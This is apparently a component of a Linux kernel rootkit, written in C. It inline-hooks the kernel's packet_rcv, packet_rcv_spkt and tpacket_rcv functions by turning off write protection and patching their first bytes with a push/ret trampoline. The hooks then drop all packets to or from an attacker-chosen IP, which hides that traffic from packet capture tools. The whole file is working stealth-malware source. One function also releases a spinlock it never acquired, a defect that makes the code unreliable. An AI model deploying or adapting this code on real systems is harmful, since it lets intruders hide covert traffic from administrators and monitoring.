#include<linux/module.h>
#include<linux/moduleparam.h>
#include<linux/string.h>
#include<linux/inet_diag.h>
#include<linux/slab.h>
#include<linux/socket.h>
#include<linux/net.h>
#include<net/ip.h>
#include<net/sock.h>
#include<linux/inet.h>
#include<linux/kallsyms.h>
#include<linux/kernel.h>

#include "hooking.h"
#include "packet_hiding.h"

#define dp() disable_wp()
#define wp() enable_wp()
#define HIJACK_LEN 6

/*
*	Functions and addresses for hijacking
*/
static unsigned long *tpacket_rcv_addr, *packet_rcv_addr,*packet_rcv_spkt_addr;
static int (*tpacket_rcv)(struct sk_buff*, struct net_device*,
			  struct packet_type*, struct net_device*);
static int (*packet_rcv)(struct sk_buff*, struct net_device*,
			  struct packet_type*, struct net_device*);
static int (*packet_rcv_spkt)(struct sk_buff*, struct net_device*,
			  struct packet_type*, struct net_device*);

static int my_tpacket_rcv(struct sk_buff*, struct net_device*,
			  struct packet_type*, struct net_device*);

static int my_packet_rcv(struct sk_buff*, struct net_device*,
			  struct packet_type*, struct net_device*);

static int my_packet_rcv_spkt(struct sk_buff*, struct net_device*,
			  struct packet_type*, struct net_device*);


static int check_packet(struct sk_buff*);

/*
*	Original 6 bytes of the hijacked functions
*/
char tpacket_rcv_code[HIJACK_LEN];
char packet_rcv_code[HIJACK_LEN];
char packet_rcv_spkt_code[HIJACK_LEN];

/*
*	Injected code used for hijacking:
*	pushq $0xADDRESS
*	retq
*/
char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
unsigned int *p_addr = (unsigned int*) (hjc+1);

/*
*	IP hiding stuff
*/
char * hidden_ip_str = "000.000.000.000";
unsigned int hidden_ip = 0;

/*
*	Module Parameters
*/
module_param(hidden_ip_str, charp, 0);
MODULE_PARM_DESC(hidden_ip_str, "IP address format: xxx.xxx.xxx.xxx");

/*
*	Union to conveniently extract parts of an 64 bit address
*/
union address_conv_t {
	unsigned long d64;
	unsigned int d32[2];
	unsigned char d8 [4];
} adc;


spinlock_t hijack_lock;

/*
* 	Convert IP string to integer
*/
unsigned int ipstr_to_int(char* ip_str)
{
	int err;
	unsigned char ip[4];
	unsigned int ret;
	const char* end;

	err = in4_pton(ip_str, -1, ip, -1, &end);
	if (err == 0) {
		return -1;
	}
	
	ret = *((unsigned int*)ip);
	return ret;
}

/*
*	Initiate fucntion hijacking by replacing the functions first bytes
*	with the code mentioned above.
*	
*/
void hijack_tpacket_rcv(void){
	spin_lock(&hijack_lock);
	adc.d64 = (unsigned long) my_tpacket_rcv;
	*p_addr = adc.d32[0];
	memcpy(tpacket_rcv_code, tpacket_rcv_addr, HIJACK_LEN); //save old code
	dp();
	memcpy(tpacket_rcv_addr, &hjc, HIJACK_LEN); //inject our code
	wp();
	spin_unlock(&hijack_lock);
}
/*
*	Hookfunction - print function's name and check if packet may pass.
*	If yes, restore old function, call and hijack again.
*/
static int my_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
			  struct packet_type *pt, struct net_device *orig_dev){
	int ret;
	printk(KERN_INFO "tpacket_rcv\n");
	if(check_packet(skb)) return 0;
	dp();
	memcpy(tpacket_rcv_addr, tpacket_rcv_code, HIJACK_LEN);
	wp();
	ret = tpacket_rcv(skb,dev,pt,orig_dev);
	hijack_tpacket_rcv();
	return ret;
}

/*
*	The following functions are just the same. Go to line 180
*/
void hijack_packet_rcv(void){
	spin_lock(&hijack_lock);
	adc.d64 = (unsigned long) my_packet_rcv;
	*p_addr = adc.d32[0];
	memcpy(packet_rcv_code, packet_rcv_addr, HIJACK_LEN);
	dp();
	memcpy(packet_rcv_addr, &hjc, HIJACK_LEN);
	wp();
	spin_unlock(&hijack_lock);
}
static int my_packet_rcv(struct sk_buff *skb, struct net_device *dev,
			  struct packet_type *pt, struct net_device *orig_dev){
	int ret;
	printk(KERN_INFO "packet_rcv\n");
	if(check_packet(skb)) return 0;
	dp();
	memcpy(packet_rcv_addr, packet_rcv_code, HIJACK_LEN);
	wp();
	ret = packet_rcv(skb,dev,pt,orig_dev);
	hijack_packet_rcv();
	return ret;
}
void hijack_packet_rcv_spkt(void){
	adc.d64 = (unsigned long) my_packet_rcv_spkt;
	*p_addr = adc.d32[0];
	memcpy(packet_rcv_spkt_code, packet_rcv_spkt_addr, HIJACK_LEN);
	dp();
	memcpy(packet_rcv_spkt_addr, &hjc, HIJACK_LEN);
	wp();
	spin_unlock(&hijack_lock);
}
static int my_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
			  struct packet_type *pt, struct net_device *orig_dev){
	int ret;
	printk(KERN_INFO "packet_rcv_spkt\n");
	if(check_packet(skb)) return 0;
	dp();
	memcpy(packet_rcv_spkt_addr, packet_rcv_spkt_code, HIJACK_LEN);
	wp();
	ret = packet_rcv_spkt(skb,dev,pt,orig_dev);
	hijack_packet_rcv_spkt();
	return ret;
}
//--------------------------------------------------------------
/*
*	Checks if the destination or source of the IP packet are
*	the ones we're looking for. Returns 1 if yes, else 0.
*/
static int check_packet(struct sk_buff* skb)
{
	printk(KERN_INFO "checking packet....\n");
	if(skb->protocol == htons(ETH_P_IP)){
		struct iphdr *hdr = (struct iphdr*) skb_network_header(skb);
		printk(KERN_INFO "checking: saddr %u daddr %u hiddenaddr %u\n",hdr->saddr,hdr->daddr,hidden_ip);
		if(hdr->saddr == hidden_ip || hdr->daddr == hidden_ip){
			printk(KERN_INFO "discarding package\n");
			return 1;
		}
	}
	return 0;
}

/*
*	Get function addresses from kallsysms, since sysmap.h doesn't provide the symbols.
*	Begin with the hijacking.
*/
void hide_packets(void){
	printk(KERN_INFO "===================================\n");
	hidden_ip = ipstr_to_int(hidden_ip_str);
	printk(KERN_INFO "IP: %s, %u\n", hidden_ip_str, hidden_ip);
	packet_rcv_addr = (unsigned long* )kallsyms_lookup_name("packet_rcv");
	packet_rcv_spkt_addr = (unsigned long* )kallsyms_lookup_name("packet_rcv_spkt");
	tpacket_rcv_addr = (unsigned long* )kallsyms_lookup_name("tpacket_rcv");
	
	packet_rcv = (int (*)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*))packet_rcv_addr;
	packet_rcv_spkt = (int (*)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*))packet_rcv_spkt_addr;
	tpacket_rcv = (int (*)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*))tpacket_rcv_addr;

	hijack_tpacket_rcv();
	hijack_packet_rcv();
	hijack_packet_rcv_spkt();
	
//	printk(KERN_INFO "0x%p\n", packet_rcv_addr);
//	printk(KERN_INFO "0x%p\n", tpacket_rcv_addr);
}
/*
*	Reset all function headers and break the hijacking chain.
*/
void unhide_packets(void){
	dp();
	memcpy(tpacket_rcv_addr, tpacket_rcv_code, HIJACK_LEN);
	memcpy(packet_rcv_addr, packet_rcv_code, HIJACK_LEN);
	memcpy(packet_rcv_spkt_addr, packet_rcv_spkt_code, HIJACK_LEN);
	wp();
}
